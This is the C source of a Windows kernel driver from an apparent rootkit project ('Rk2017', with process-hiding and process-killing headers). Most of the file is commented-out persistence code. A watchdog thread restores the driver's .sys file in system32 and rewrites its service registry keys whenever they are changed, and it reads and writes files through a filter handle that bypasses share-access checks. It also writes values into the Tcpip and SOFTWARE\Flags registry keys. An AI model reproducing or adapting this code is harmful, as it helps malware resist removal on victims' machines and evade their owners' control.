#include "rk.h"
#include "InitializeInjectRelevantInfo.h"
#include "DrvFunction.h"
#include "Rk2017Hook.h"
#include "HideProcess.h"
#include "ApcKillProcess.h"
#include "SystemPreInit.h"

LIST_ENTRY g_CheckProtectFileList;
KSPIN_LOCK g_SpinLockProtectFileList;

static PVOID kOriginalFileImage = 0;
static ULONG kOriginalFileLength = 0;

void InitializeProtectFileList()
{
	InitializeListHead(&g_CheckProtectFileList);
	KeInitializeSpinLock(&g_SpinLockProtectFileList);
}
VOID SystemSleep(LONGLONG sec)
{
	LARGE_INTEGER interval;

	interval.QuadPart = (sec * DELAY_ONE_SECOND);
	KeDelayExecutionThread(KernelMode,FALSE,&interval);		
}
//BOOLEAN DrvCheckFileSystemIsOK()
//{
//	HANDLE FileHandle;
//	OBJECT_ATTRIBUTES ObjectAttributes;
//	UNICODE_STRING FileName;
//	IO_STATUS_BLOCK IoStatus;
//	NTSTATUS Status;
//	BOOLEAN bRet;
//
//	bRet = FALSE;
//	Status = STATUS_UNSUCCESSFUL;
//
//	RtlInitUnicodeString(&FileName,L"\\SystemRoot");
//	InitializeObjectAttributes(&ObjectAttributes,&FileName,OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,NULL,NULL);
//
//	if (g_Rk2017RunTimeLibrary.bIsStartFilter == TRUE && \
//		g_Rk2017RunTimeLibrary.phFltHide != NULL && \
//		g_Rk2017RunTimeLibrary.pFltInstance != NULL)
//	{
//		Status = FltCreateFile(g_Rk2017RunTimeLibrary.phFltHide, \
//			g_Rk2017RunTimeLibrary.pFltInstance, \
//			&FileHandle, \
//			GENERIC_ALL, \
//			&ObjectAttributes, \
//			&IoStatus, \
//			NULL, \
//			FILE_ATTRIBUTE_NORMAL, \
//			FILE_SHARE_READ, \
//			FILE_OPEN, \
//			FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, \
//			NULL, \
//			0, \
//			IO_IGNORE_SHARE_ACCESS_CHECK);
//		if(NT_SUCCESS(Status))
//		{		
//			FltClose(FileHandle);
//			bRet = TRUE;
//		}
//	}
//	else
//	{
//		Status = ZwCreateFile(&FileHandle, \
//			GENERIC_ALL, \
//			&ObjectAttributes, \
//			&IoStatus, \
//			NULL, \
//			FILE_ATTRIBUTE_NORMAL, \
//			FILE_SHARE_READ, \
//			FILE_OPEN, \
//			FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, \
//			NULL, \
//			0);
//		if(NT_SUCCESS(Status))
//		{		
//			ZwClose(FileHandle);
//			bRet = TRUE;
//		}
//	}
//	return bRet;
//}
//VOID DrvReInitCallback(IN PDRIVER_OBJECT pDriverObject,IN PVOID pContext,IN ULONG ulCount)
//{
//	if (!DrvCheckFileSystemIsOK())
//	{
//		IoRegisterDriverReinitialization(pDriverObject,DrvReInitCallback,pContext);
//	}
//	else
//	{
//		Rk2017Process(&g_Rk2017RunTimeLibrary);
//	}
//}
//VOID SystemPreInit(PDRIVER_OBJECT pDrvObj)
//{
//	if (!DrvCheckFileSystemIsOK())
//	{
//		IoRegisterDriverReinitialization(pDrvObj,DrvReInitCallback,NULL);
//	}
//	else
//	{
//		Rk2017Process(&g_Rk2017RunTimeLibrary);
//	}
//}
//VOID RK2017WordThread(IN PVOID pStartContext)
//{
//	PRK2017_RUNTIME_LIBRARY pRk2017RunTimeLibrary;
//
//	pRk2017RunTimeLibrary = (PRK2017_RUNTIME_LIBRARY)pStartContext;
//	if (NULL == pRk2017RunTimeLibrary)
//	{
//		return;
//	}
//	KeSetPriorityThread(KeGetCurrentThread(),LOW_REALTIME_PRIORITY);
//	while (TRUE)
//	{
//		if (pRk2017RunTimeLibrary->bIsUninstall)
//		{
//			break;
//		}
//		if (g_Rk2017RunTimeLibrary.pFltInstance != NULL && \
//			g_Rk2017RunTimeLibrary.phFltHide != NULL)
//		{
//			if(FileCheck() && pRk2017RunTimeLibrary->bIsUninstall == FALSE)
//			{
//				FileLock();
//			}
//			if(RegCheck() && pRk2017RunTimeLibrary->bIsUninstall == FALSE)
//			{
//				RegLock();
//			}
//		}
//		System_Sleep(WATCHDOG_INTERNAL);
//	}
//	PsTerminateSystemThread(TRUE);
//}
//NTSTATUS Rk2017Process(PRK2017_RUNTIME_LIBRARY pRk2017RTLib)
//{
//	HANDLE hProcessThread;
//	NTSTATUS Status;
//
//	hProcessThread = NULL;
//	Status = STATUS_UNSUCCESSFUL;
//
//	Status = PsCreateSystemThread(&hProcessThread, \
//		0, \
//		NULL, \
//		NULL, \
//		NULL, \
//		RK2017WordThread, \
//		pRk2017RTLib);
//	if (NT_ERROR(Status))
//	{
//		return Status;
//	}
//	ZwClose(hProcessThread);
//	return Status;
//}
//static ULONG GetSumCheck(PVOID buffer,int len)
//{
//	ULONG ulSum;
//	ULONG uli;
//
//	ulSum = 0;
//
//	for(uli = 0;uli < len - sizeof(ULONG);uli++)
//	{
//		ulSum += ((PCHAR)buffer)[uli];
//	}
//	return ulSum;
//}
//
//VOID FileLock()
//{
//	CHAR FilePathName[MAX_PATH];
//
//	if(g_Rk2017RunTimeLibrary.DrvName[0] == 0)
//	{
//		return;
//	}
//
//	RtlZeroMemory(FilePathName,MAX_PATH);
//	StringCchPrintfA(FilePathName,MAX_PATH,"\\SystemRoot\\system32\\%s.sys",g_Rk2017RunTimeLibrary.DrvName);
//
//	if(kOriginalFileImage == 0 || kOriginalFileLength == 0)
//	{
//		return;
//	}
//	WriteFile_S1(FilePathName,(PCHAR)kOriginalFileImage,kOriginalFileLength);
//}
//BOOLEAN FileCheckFromPath(PCHAR pFileName)
//{
//	BOOLEAN bRet;	
//	PVOID pFileImage;
//	ULONG ulFileLength;
//	PCHECK_PROTECT_FILE_LIST pCheckProtectFileList;
//
//	bRet = FALSE;
//	pFileImage = NULL;
//	ulFileLength = 0;
//	pCheckProtectFileList = NULL;
//
//	do 
//	{
//		if(g_Rk2017RunTimeLibrary.DrvName[0] == 0)
//		{
//			break;
//		}
//		if (IsListEmpty(&g_CheckProtectFileList) == FALSE)
//		{
//			pCheckProtectFileList = (PCHECK_PROTECT_FILE_LIST)g_CheckProtectFileList.Flink;
//			while (pCheckProtectFileList != (PCHECK_PROTECT_FILE_LIST)pCheckProtectFileList->NextList.Flink)
//			{
//				if (pCheckProtectFileList->bIsLoader)
//				{
//					if(pCheckProtectFileList->kOriginalFileImage == 0 || pCheckProtectFileList->kOriginalFileLength == 0)
//					{
//						pCheckProtectFileList->kOriginalFileImage = (PVOID)ReadFile_S1(pCheckProtectFileList->FileName, \
//							&pCheckProtectFileList->kOriginalFileLength);
//						break;
//					}
//					if(pCheckProtectFileList->kOriginalFileImage == 0 || pCheckProtectFileList->kOriginalFileLength == 0)
//					{
//						break;
//					}
//					pFileImage = (PVOID)ReadFile_S1(pFileName,&ulFileLength);
//					if(ulFileLength == pCheckProtectFileList->kOriginalFileLength && \
//						GetSumCheck(pCheckProtectFileList->kOriginalFileImage,pCheckProtectFileList->kOriginalFileLength) == \
//						GetSumCheck(pFileImage,ulFileLength))
//					{
//						break;
//					}
//					bRet = TRUE;
//				}
//				pCheckProtectFileList = (PCHECK_PROTECT_FILE_LIST)pCheckProtectFileList->NextList.Flink;
//			}
//		}
//	} while (0);
//
//	if(pFileImage)
//	{
//		ExFreePool(pFileImage);
//		pFileImage = NULL;
//	}
//	return bRet;
//}
//BOOLEAN FileCheck()
//{
//	BOOLEAN bRet;
//	CHAR FilePathName[MAX_PATH];		
//	PVOID pFileImage;
//	ULONG ulFileLength;
//
//	bRet = FALSE;
//	pFileImage = NULL;
//	ulFileLength = 0;
//
//	do 
//	{
//		if(g_Rk2017RunTimeLibrary.DrvName[0] == 0)
//		{
//			break;
//		}
//		RtlZeroMemory(FilePathName,MAX_PATH);
//		StringCchPrintfA(FilePathName,MAX_PATH,"\\SystemRoot\\system32\\%s.sys",g_Rk2017RunTimeLibrary.DrvName);
//
//		if(kOriginalFileImage == 0 || kOriginalFileLength == 0)
//		{
//			kOriginalFileImage = (PVOID)ReadFile_S1(FilePathName,&kOriginalFileLength);
//			break;
//		}
//		if(kOriginalFileImage == 0 || kOriginalFileLength == 0)
//		{
//			break;
//		}
//
//		pFileImage = (PVOID)ReadFile_S1(FilePathName,&ulFileLength);
//		if(ulFileLength == kOriginalFileLength && \
//			GetSumCheck(kOriginalFileImage,kOriginalFileLength) == \
//			GetSumCheck(pFileImage,ulFileLength))
//		{
//			break;
//		}
//		bRet = TRUE;
//	} while (0);
//
//	if(pFileImage)
//	{
//		ExFreePool(pFileImage);
//		pFileImage = NULL;
//	}
//	return bRet;
//}
//BOOLEAN FileIsError(PUNICODE_STRING pUnFileName)
//{
//	HANDLE hFile;
//	OBJECT_ATTRIBUTES Objectattributes;
//	NTSTATUS Status;
//	IO_STATUS_BLOCK IoStatusBlock;
//
//	InitializeObjectAttributes(&Objectattributes,pUnFileName,OBJ_KERNEL_HANDLE,NULL,NULL);
//	Status = FltCreateFile(g_Rk2017RunTimeLibrary.phFltHide, \
//		g_Rk2017RunTimeLibrary.pFltInstance, \
//		&hFile, \
//		GENERIC_ALL, \
//		&Objectattributes, \
//		&IoStatusBlock, \
//		NULL, \
//		FILE_ATTRIBUTE_NORMAL, \
//		FILE_SHARE_READ | FILE_SHARE_WRITE, \
//		FILE_OPEN, \
//		FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE | FILE_WRITE_THROUGH | FILE_SEQUENTIAL_ONLY, \
//		NULL, \
//		0, \
//		IO_IGNORE_SHARE_ACCESS_CHECK);
//	if (NT_ERROR(Status))
//	{
//		FltClose(hFile);
//		return FALSE;
//	}
//	return TRUE;
//}
//PCHAR ReadFile_S1(char* pszFileName,ULONG* uSizeX)
//{
//	PCHAR uRet = 0;
//	NTSTATUS Status = STATUS_UNSUCCESSFUL;
//	UNICODE_STRING unicFileName;
//	ANSI_STRING ansiFileName;
//	ULONG ulFlagsOut = 0;
//	PFILE_OBJECT pFileObject;
//	HANDLE hFile = NULL;
//	IO_STATUS_BLOCK ioStatus = {0};
//	OBJECT_ATTRIBUTES obattrSource = {0};
//	ULONG ulRetBytes;
//
//	pFileObject = NULL;
//	ulRetBytes = 0;
//
//	RtlInitAnsiString(&ansiFileName,pszFileName);
//	Status = RtlAnsiStringToUnicodeString(&unicFileName,&ansiFileName,TRUE);
//	if (NT_SUCCESS(Status))
//	{
//		InitializeObjectAttributes(&obattrSource,&unicFileName,OBJ_KERNEL_HANDLE|OBJ_CASE_INSENSITIVE,NULL,NULL);
//		Status = FltCreateFile(g_Rk2017RunTimeLibrary.phFltHide, \
//			g_Rk2017RunTimeLibrary.pFltInstance, \
//			&hFile, \
//			SYNCHRONIZE|GENERIC_READ, \
//			&obattrSource, \
//			&ioStatus, \
//			NULL, \
//			FILE_ATTRIBUTE_NORMAL, \
//			FILE_SHARE_READ | FILE_SHARE_WRITE, \
//			FILE_OPEN, \
//			FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE, \
//			NULL, \
//			0, \
//			IO_IGNORE_SHARE_ACCESS_CHECK);
//		if (NT_SUCCESS(Status))
//		{
//			FILE_STANDARD_INFORMATION fiStandard = {0};
//
//			Status = ObReferenceObjectByHandle(hFile, \
//				GENERIC_ALL, \
//				*IoFileObjectType, \
//				KernelMode, \
//				&pFileObject, \
//				NULL);
//			if (NT_SUCCESS(Status))
//			{
//				Status = FltQueryInformationFile(g_Rk2017RunTimeLibrary.pFltInstance, \
//					pFileObject, \
//					&fiStandard, \
//					sizeof(FILE_STANDARD_INFORMATION), \
//					FileStandardInformation, \
//					&ulRetBytes);
//				if (NT_SUCCESS(Status))
//				{
//					if (fiStandard.EndOfFile.HighPart == 0 && fiStandard.EndOfFile.LowPart <= 32*1024*1024)
//					{
//						ULONG uSize = fiStandard.EndOfFile.LowPart;
//						PCHAR pBuffer = (PCHAR)ExAllocatePool(NonPagedPool,uSize);
//
//						if (pBuffer)
//						{
//							LARGE_INTEGER liOffset;
//
//							liOffset.HighPart = 0;
//							liOffset.LowPart = 0;
//							RtlZeroMemory(pBuffer,uSize);
//							Status = FltReadFile(g_Rk2017RunTimeLibrary.pFltInstance, \
//								pFileObject, \
//								NULL, \
//								uSize, \
//								pBuffer, \
//								FLTFL_IO_OPERATION_NON_CACHED, \
//								&liOffset.LowPart, \
//								NULL,
//								NULL);
//							if (NT_SUCCESS(Status) && ioStatus.Information == fiStandard.EndOfFile.LowPart)
//							{
//								uRet = pBuffer;
//								*uSizeX = uSize;
//							}
//							//fixed
//							//ExFreePool(pBuffer);
//						}
//					}
//				}
//				ObDereferenceObject(pFileObject);
//			}
//			FltClose(hFile);
//		}
//		else
//		{
//		}
//		RtlFreeUnicodeString(&unicFileName);
//	}
//	return uRet;
//}
//ULONG WriteFile_S1(char* pszFileName,PCHAR pBuffer,ULONG uSize)
//{
//	ULONG uRet = 0;
//	NTSTATUS Status = STATUS_UNSUCCESSFUL;
//	UNICODE_STRING unicFileName;
//	ANSI_STRING ansiFileName;
//	ULONG ulFlags = 0;
//	PFILE_OBJECT pFileObject;
//	ULONG ulBytesWrite;
//
//	pFileObject = NULL;
//	ulBytesWrite = 0;
//
//	RtlInitAnsiString(&ansiFileName, pszFileName);
//	Status = RtlAnsiStringToUnicodeString(&unicFileName, &ansiFileName, TRUE);
//	if (NT_SUCCESS(Status))
//	{
//		HANDLE hFile = NULL;
//		IO_STATUS_BLOCK ioStatus = {0};
//		OBJECT_ATTRIBUTES obattrSource = {0};
//
//		InitializeObjectAttributes(&obattrSource,&unicFileName,OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE,NULL,NULL);
//
//		Status = FltCreateFile(g_Rk2017RunTimeLibrary.phFltHide, \
//			g_Rk2017RunTimeLibrary.pFltInstance, \
//			&hFile, \
//			SYNCHRONIZE | FILE_WRITE_DATA | FILE_READ_DATA, \
//			&obattrSource, \
//			&ioStatus, \
//			NULL, \
//			FILE_ATTRIBUTE_NORMAL, \
//			FILE_SHARE_READ | FILE_SHARE_WRITE, \
//			FILE_OPEN_IF, \
//			FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE | FILE_WRITE_THROUGH | FILE_SEQUENTIAL_ONLY, \
//			NULL, \
//			0, \
//			IO_IGNORE_SHARE_ACCESS_CHECK);
//		if (NT_SUCCESS(Status))
//		{
//			Status = ObReferenceObjectByHandle(hFile, \
//				GENERIC_ALL, \
//				*IoFileObjectType, \
//				KernelMode, \
//				&pFileObject, \
//				NULL);
//			if (NT_SUCCESS(Status))
//			{
//				Status = FltWriteFile(g_Rk2017RunTimeLibrary.pFltInstance, \
//					pFileObject, \
//					0, \
//					uSize, \
//					pBuffer, \
//					FLTFL_IO_OPERATION_NON_CACHED, \
//					&ulBytesWrite,
//					NULL, \
//					NULL);
//				if (NT_SUCCESS(Status) && ulBytesWrite == uSize)
//				{
//					FILE_END_OF_FILE_INFORMATION feofi;
//
//					feofi.EndOfFile.HighPart = 0;
//					feofi.EndOfFile.LowPart = uSize;
//
//					Status = FltSetInformationFile(g_Rk2017RunTimeLibrary.pFltInstance, \
//						pFileObject, \
//						&feofi, \
//						sizeof(FILE_END_OF_FILE_INFORMATION), \
//						FileEndOfFileInformation);
//					if (NT_SUCCESS(Status))
//					{
//						uRet = uSize;
//					}
//					else
//					{
//					}
//				}
//				else
//				{
//					ulFlags++;
//					Status = SetFlagsValue(ulFlags);
//					if (NT_SUCCESS(Status))
//					{
//					}
//				}
//			}
//			FltClose(hFile);
//		}
//		else
//		{
//		}
//		RtlFreeUnicodeString(&unicFileName);
//	}
//	return uRet;
//}
//
//BOOLEAN CreateFile_S1(char* pszFileName)
//{
//	BOOLEAN bRet = 0;
//	NTSTATUS Status = STATUS_UNSUCCESSFUL;
//	UNICODE_STRING unicFileName;
//	ANSI_STRING ansiFileName;
//
//	RtlInitAnsiString(&ansiFileName,pszFileName);
//	Status = RtlAnsiStringToUnicodeString(&unicFileName,&ansiFileName,TRUE);
//	if (NT_SUCCESS(Status))
//	{
//		HANDLE hFile = NULL;
//		IO_STATUS_BLOCK ioStatus = {0};
//		OBJECT_ATTRIBUTES obattrSource = {0};
//
//		InitializeObjectAttributes(&obattrSource,&unicFileName,OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE,NULL,NULL);
//		Status = FltCreateFile(g_Rk2017RunTimeLibrary.phFltHide, \
//			g_Rk2017RunTimeLibrary.pFltInstance, \
//			&hFile, \
//			SYNCHRONIZE|FILE_WRITE_DATA|FILE_READ_DATA, \
//			&obattrSource, \
//			&ioStatus, \
//			NULL, \
//			FILE_ATTRIBUTE_NORMAL, \
//			FILE_SHARE_READ, \
//			FILE_SUPERSEDE, \
//			FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE | FILE_WRITE_THROUGH | FILE_SEQUENTIAL_ONLY, \
//			NULL, \
//			0, \
//			IO_IGNORE_SHARE_ACCESS_CHECK);
//		if (NT_SUCCESS(Status))
//		{
//			bRet = 1;
//			FltClose(hFile);
//		}
//		else
//		{
//			
//		}
//		RtlFreeUnicodeString(&unicFileName);
//	}
//	return bRet;
//}
//
//BOOLEAN FileCopy_S1(IN char *pszSrc,IN char *pszTarget)
//{
//	ULONG uRet = 0;
//	ULONG uSize = 0;
//	PCHAR pBuffer = ReadFile_S1(pszSrc,&uSize);
//	if(pBuffer)
//	{
//		uRet = WriteFile_S1(pszTarget,pBuffer,uSize);
//		if(uRet!=uSize)
//		{
//			uRet = 0;
//		}
//		uRet = 1;
//		ExFreePool(pBuffer);
//	}
//	else
//	{
//		uRet = 0;
//	}
//	return (uRet > 0);
//}
//BOOLEAN FileExists_S1(char* szFileName)
//{
//	HANDLE FileHandle = 0;
//	OBJECT_ATTRIBUTES ObjectAttributes = {0};
//	IO_STATUS_BLOCK IoStatus = {0};
//	NTSTATUS Status = STATUS_SUCCESS;
//	BOOLEAN bRet = 0;
//	ANSI_STRING ansiFileName;
//	UNICODE_STRING unicFileName;
//
//	RtlInitAnsiString(&ansiFileName,szFileName);
//	Status = RtlAnsiStringToUnicodeString(&unicFileName,&ansiFileName,TRUE);
//	if (NT_SUCCESS(Status))
//	{
//		InitializeObjectAttributes(&ObjectAttributes,&unicFileName,OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE,NULL,NULL);
//		Status = FltCreateFile(g_Rk2017RunTimeLibrary.phFltHide, \
//			g_Rk2017RunTimeLibrary.pFltInstance, \
//			&FileHandle, \
//			SYNCHRONIZE|GENERIC_READ, \
//			&ObjectAttributes, \
//			&IoStatus, \
//			NULL, \
//			FILE_ATTRIBUTE_NORMAL, \
//			FILE_SHARE_READ | FILE_SHARE_WRITE, \
//			FILE_OPEN, \
//			FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE, \
//			NULL, \
//			0, \
//			IO_IGNORE_SHARE_ACCESS_CHECK);
//		if(NT_SUCCESS(Status))
//		{
//			FltClose(FileHandle);
//			bRet = 1;
//		}
//		RtlFreeUnicodeString(&unicFileName);
//	}
//	return bRet;
//}
//VOID RegLock()
//{
//	NTSTATUS ntStatus;
//	HANDLE hServKey;
//	OBJECT_ATTRIBUTES obServKeyPath;	
//	UNICODE_STRING unicServKeyPath;	
//	UNICODE_STRING unicStart;
//	UNICODE_STRING unicType;
//	UNICODE_STRING unicErrorControl;
//	UNICODE_STRING unicImagePath;
//	ULONG ulTemp = 0x00;
//	ULONG ulStart;
//	WCHAR wcKeyPath[256] = L"\\registry\\machine\\system\\currentcontrolset\\services\\";
//	WCHAR wcSysPath[256] = L"\\SystemRoot\\System32\\";
//
//	do
//	{			
//		if(g_Rk2017RunTimeLibrary.wDrvName[0] == 0)
//		{
//			break;
//		}
//
//		wcscat_s(wcKeyPath,256,g_Rk2017RunTimeLibrary.wDrvName);
//		RtlInitUnicodeString(&unicServKeyPath,wcKeyPath);
//		InitializeObjectAttributes(&obServKeyPath,&unicServKeyPath,OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,NULL,NULL);
//
//		RtlInitUnicodeString(&unicStart,L"Start");
//		RtlInitUnicodeString(&unicType,L"Type");
//		RtlInitUnicodeString(&unicErrorControl,L"ErrorControl");
//		RtlInitUnicodeString(&unicImagePath,L"ImagePath");
//
//		ntStatus = ZwCreateKey(&hServKey,KEY_SET_VALUE|KEY_WRITE|KEY_ALL_ACCESS,&obServKeyPath,0,NULL,REG_OPTION_NON_VOLATILE,0);
//		if (NT_SUCCESS(ntStatus))
//		{
//			//fixed
//			//ZwDeleteValueKey(hServKey,&unicImagePath);
//
//			wcscat_s(wcSysPath,256,g_Rk2017RunTimeLibrary.wDrvName);
//			wcscat_s(wcSysPath,256,L".sys");
//			ulStart = START_DEFAULT_VALUE;
//			ulTemp = 0x01;
//			ZwSetValueKey(hServKey,&unicType,0,REG_DWORD,&ulTemp,sizeof(ULONG));
//			ZwSetValueKey(hServKey,&unicErrorControl,0,REG_DWORD,&ulTemp,sizeof(ULONG));
//			ZwSetValueKey(hServKey,&unicStart,0,REG_DWORD,&ulStart,sizeof(ULONG));
//			ZwSetValueKey(hServKey,&unicImagePath,0,REG_EXPAND_SZ,wcSysPath,wcslen(wcSysPath)*2);
//			ZwClose(hServKey);
//		}
//
//	}while(0);
//
//	return;
//}
//
//BOOLEAN RegCheck()
//{
//	BOOLEAN bRet = FALSE;
//	NTSTATUS status;
//	WCHAR* wcSysPathTemp;
//	HANDLE hServKey = 0;
//	OBJECT_ATTRIBUTES obServKeyPath;	
//	UNICODE_STRING unicServKeyPath;	
//	WCHAR wcKeyPath[256] = L"\\registry\\machine\\system\\currentcontrolset\\services\\";
//	WCHAR wcSysPath[256] = L"\\SystemRoot\\System32\\";
//
//	UNICODE_STRING unicValueName;
//	UCHAR buffer[sizeof( KEY_VALUE_PARTIAL_INFORMATION ) + /*sizeof( LONG )*/sizeof(wcSysPath)];
//	ULONG resultLength;
//	ULONG dwValue;
//
//	do
//	{
//		if(g_Rk2017RunTimeLibrary.wDrvName[0] == 0)
//		{
//			break;
//		}
//		wcscat_s(wcKeyPath,256,g_Rk2017RunTimeLibrary.wDrvName);
//		RtlInitUnicodeString(&unicServKeyPath,wcKeyPath);
//		InitializeObjectAttributes(&obServKeyPath,&unicServKeyPath,OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,NULL,NULL);
//		status = ZwOpenKey(&hServKey,
//			KEY_READ,
//			&obServKeyPath);
//		if (!NT_SUCCESS(status))
//		{
//			bRet = TRUE;
//			break;
//		}
//		RtlInitUnicodeString(&unicValueName,L"Start");
//		status = ZwQueryValueKey(hServKey,
//			&unicValueName,
//			KeyValuePartialInformation,
//			buffer,
//			sizeof(buffer),
//			&resultLength);
//		if (!NT_SUCCESS(status))
//		{
//			bRet = TRUE;
//			break;
//		}
//		dwValue = *((PLONG)&(((PKEY_VALUE_PARTIAL_INFORMATION) buffer)->Data));
//		if(dwValue != START_DEFAULT_VALUE)
//		{
//			bRet = TRUE;
//			break;			
//		}
//		RtlInitUnicodeString(&unicValueName,L"Type");
//		status = ZwQueryValueKey(hServKey,
//			&unicValueName,
//			KeyValuePartialInformation,
//			buffer,
//			sizeof(buffer),
//			&resultLength);
//		if (!NT_SUCCESS(status))
//		{
//			bRet = TRUE;
//			break;
//		}
//		dwValue = *((PLONG)&(((PKEY_VALUE_PARTIAL_INFORMATION)buffer)->Data));
//		if(dwValue != START_DEFAULT_VALUE)
//		{
//			bRet = TRUE;
//			break;			
//		}
//		RtlInitUnicodeString(&unicValueName,L"ErrorControl");
//		status = ZwQueryValueKey(hServKey,
//			&unicValueName,
//			KeyValuePartialInformation,
//			buffer,
//			sizeof(buffer),
//			&resultLength);
//		if (!NT_SUCCESS(status))
//		{
//			bRet = TRUE;
//			break;
//		}
//		dwValue = *((PLONG)&(((PKEY_VALUE_PARTIAL_INFORMATION)buffer)->Data));
//		if(dwValue != START_DEFAULT_VALUE)
//		{
//			bRet = TRUE;
//			break;			
//		}
//		wcscat_s(wcSysPath,256,g_Rk2017RunTimeLibrary.wDrvName);
//		wcscat_s(wcSysPath,256,L".sys");
//		RtlInitUnicodeString(&unicValueName,L"ImagePath");
//		status = ZwQueryValueKey(hServKey,
//			&unicValueName,
//			KeyValuePartialInformation,
//			buffer,
//			sizeof(buffer),
//			&resultLength);
//		// 		if (NT_SUCCESS( status ) || status == STATUS_BUFFER_TOO_SMALL
//		// 			|| status == STATUS_BUFFER_OVERFLOW ) {
//		// 			bRet = TRUE;
//		// 			break;
//		// 		}
//		if (!NT_SUCCESS(status))
//		{
//			bRet = TRUE;
//			break;
//		}
//		wcSysPathTemp = (WCHAR*)(((PKEY_VALUE_PARTIAL_INFORMATION)buffer)->Data);
//		if(wcSysPathTemp[0] == 0)
//		{
//			bRet = TRUE;
//			break;
//		}
//		wcSysPathTemp[MAX_PATH - 1] = 0;
//		wcSysPath[MAX_PATH - 1] = 0;
//		if(_wcsicmp(wcSysPath,wcSysPathTemp))
//		{
//			bRet = TRUE;
//			break;
//		}
//	} while(0);
//
//	if(hServKey)
//	{
//		ZwClose(hServKey);
//	}
//	return bRet;
//}
//
//LONG RegRead(PWCHAR value_name)
//{
//	NTSTATUS status;
//
//	HANDLE hServKey = 0;
//	OBJECT_ATTRIBUTES obServKeyPath;	
//	UNICODE_STRING unicServKeyPath;	
//	WCHAR wcKeyPath[256] = L"\\registry\\machine\\system\\currentcontrolset\\services\\";
//
//	UNICODE_STRING unicValueName;
//	UCHAR buffer[sizeof( KEY_VALUE_PARTIAL_INFORMATION ) + sizeof( LONG )];
//	ULONG resultLength;
//	LONG dwValue = 0;
//
//	do
//	{
//		if(g_Rk2017RunTimeLibrary.DrvName == 0)
//		{
//			break;
//		}
//		wcscat_s(wcKeyPath,256,L"Tcpip");
//		RtlInitUnicodeString(&unicServKeyPath,wcKeyPath);
//		InitializeObjectAttributes(&obServKeyPath,&unicServKeyPath,OBJ_CASE_INSENSITIVE|OBJ_KERNEL_HANDLE,NULL,NULL);
//		status = ZwOpenKey( &hServKey,
//			KEY_READ,
//			&obServKeyPath );
//		if (!NT_SUCCESS(status)) 
//		{
//			break;
//		}
//		RtlInitUnicodeString(&unicValueName,value_name);
//		status = ZwQueryValueKey(hServKey,
//			&unicValueName,
//			KeyValuePartialInformation,
//			buffer,
//			sizeof(buffer),
//			&resultLength);
//		if (!NT_SUCCESS(status)) 
//		{
//			break;
//		}
//		dwValue = *((PLONG)&(((PKEY_VALUE_PARTIAL_INFORMATION)buffer)->Data));
//	}while(0);
//
//	if(hServKey)
//	{
//		ZwClose(hServKey);
//	}
//	return dwValue;
//}
//
//VOID RegWrite(PWCHAR value_name,LONG value_value)
//{
//	NTSTATUS ntStatus;
//	HANDLE hServKey;
//	OBJECT_ATTRIBUTES obServKeyPath;	
//	UNICODE_STRING unicServKeyPath;	
//	UNICODE_STRING unicSubKey;
//	WCHAR wcKeyPath[256] = L"\\registry\\machine\\system\\currentcontrolset\\services\\";
//
//	do
//	{			
//		if(g_Rk2017RunTimeLibrary.DrvName[0] == 0)
//		{
//			break;
//		}
//
//		wcscat_s(wcKeyPath,256,L"Tcpip");
//		RtlInitUnicodeString(&unicServKeyPath,wcKeyPath);
//		InitializeObjectAttributes(&obServKeyPath,&unicServKeyPath,OBJ_CASE_INSENSITIVE|OBJ_KERNEL_HANDLE,NULL,NULL);
//		ntStatus = ZwCreateKey(&hServKey,KEY_SET_VALUE|KEY_WRITE|KEY_ALL_ACCESS,&obServKeyPath,0,NULL,REG_OPTION_NON_VOLATILE,0);
//		if (NT_SUCCESS(ntStatus))
//		{
//			RtlInitUnicodeString(&unicSubKey, value_name);
//			ZwSetValueKey(hServKey, &unicSubKey, 0, REG_DWORD, &value_value, sizeof(LONG));
//			ZwClose(hServKey);
//		}
//	}while(0);
//	return;
//}
//NTSTATUS SetFlagsValue(ULONG ulFlags)
//{
//	NTSTATUS status;
//	HANDLE hReg;
//	UNICODE_STRING unRegPath;
//	ULONG ulRet;
//	UNICODE_STRING unicFlags;
//	OBJECT_ATTRIBUTES objectattributes;
//	WCHAR wcKeyPath[] = L"\\registry\\machine\\SOFTWARE\\Flags\\";
//	status = STATUS_SUCCESS;
//
//	RtlInitUnicodeString(&unRegPath,wcKeyPath);
//	InitializeObjectAttributes(&objectattributes,&unRegPath,OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE,NULL,NULL);
//	status = ZwCreateKey(&hReg,
//		KEY_ALL_ACCESS,
//		&objectattributes,
//		0,
//		NULL,
//		REG_OPTION_NON_VOLATILE,
//		&ulRet);
//	if (!NT_SUCCESS(status))
//	{
//		DbgPrint("ZwCreateKey is failed\n");
//		return status;
//	}
//	RtlInitUnicodeString(&unicFlags,L"Flag");
//	status = ZwSetValueKey(hReg,&unicFlags,0,REG_DWORD,&ulFlags,sizeof(ULONG));
//	if (!NT_SUCCESS(status))
//	{
//		DbgPrint("Write flags success\n");
//	}
//	return status;
//}